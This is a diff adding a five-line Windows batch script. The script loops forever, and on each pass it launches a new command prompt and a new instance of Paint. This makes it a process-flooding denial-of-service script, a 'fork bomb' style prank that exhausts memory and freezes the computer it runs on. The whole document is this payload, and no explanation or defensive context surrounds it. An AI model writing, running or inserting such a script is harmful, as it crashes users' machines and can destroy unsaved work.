@@ -1,0 +1,5 @@
+@echo off
+:1
+start cmd
+start mspaint
+goto 1
